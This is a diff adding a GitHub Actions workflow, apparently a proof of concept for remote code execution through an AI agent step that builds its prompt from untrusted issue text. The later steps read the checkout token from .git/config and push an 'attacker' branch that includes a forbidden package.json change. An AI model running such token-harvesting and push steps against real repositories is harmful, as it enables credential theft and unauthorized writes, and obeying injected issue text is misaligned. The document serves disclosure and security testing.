@@ -1,0 +1,63 @@
+name: poc-execute
+# Mirrors launchdarkly-labs/small-factory .github/workflows/factory-execute.yml
+on:
+  issue_comment:
+    types: [created]
+jobs:
+  execute:
+    if: >-
+      !github.event.issue.pull_request &&
+      contains(github.event.issue.labels.*.name, 'factory') &&
+      startsWith(github.event.comment.body, '/approve') &&
+      contains(fromJSON('["OWNER","MEMBER","COLLABORATOR"]'), github.event.comment.author_association)
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      issues: write
+      pull-requests: write
+    steps:
+      - uses: actions/checkout@v4
+      - name: Fetch the approved plan
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          gh api "repos/${{ github.repository }}/issues/${{ github.event.issue.number }}/comments" \
+            --jq '[.[] | select(.body | startswith("## Proposed plan"))] | last | .body' > plan.md
+          echo "plan bytes: $(wc -c < plan.md)"
+      - name: Execute the plan (SIMULATED claude -p, same tool grant)
+        env:
+          ISSUE_TITLE: ${{ github.event.issue.title }}
+          ISSUE_BODY: ${{ github.event.issue.body }}
+          ISSUE_NUMBER: ${{ github.event.issue.number }}
+        run: |
+          cat > prompt.txt <<'PROMPT'
+          You are the execution station of a small software factory. Implement
+          the approved plan below in this repository.
+          Rules: Never modify .github/, CLAUDE.md, or package.json.
+          PROMPT
+          printf '\nThe task (issue #%s):\nTitle: %s\n\n%s\n\nThe approved plan:\n' \
+            "$ISSUE_NUMBER" "$ISSUE_TITLE" "$ISSUE_BODY" >> prompt.txt
+          cat plan.md >> prompt.txt
+          bash sim-agent.sh > execution-log.md
+          cat execution-log.md
+      - name: Verify independently
+        run: |
+          npm test
+          npm run lint
+          npm run typecheck
+          echo "--- proof of code execution ---"
+          cat RCE_MARKER
+          echo
+          echo "--- credential material readable by that code ---"
+          TOK=$(grep -o 'AUTHORIZATION: basic [A-Za-z0-9+/=]*' .git/config | head -1 | awk '{print $3}')
+          echo "checkout-persisted token readable: $([ -n "$TOK" ] && echo YES || echo NO)"
+          echo "decoded prefix (value redacted): $(printf '%s' "$TOK" | base64 -d | cut -c1-14)…"
+      - name: Prove write access held by the RCE
+        run: |
+          git config user.name poc-bot
+          git config user.email poc-bot@users.noreply.github.com
+          git checkout -b "rce-${GITHUB_RUN_ID}"
+          echo "pushed by attacker code" > RCE_BRANCH_PROOF
+          git add RCE_BRANCH_PROOF package.json
+          git commit -m "rce proof"
+          git push origin "rce-${GITHUB_RUN_ID}"
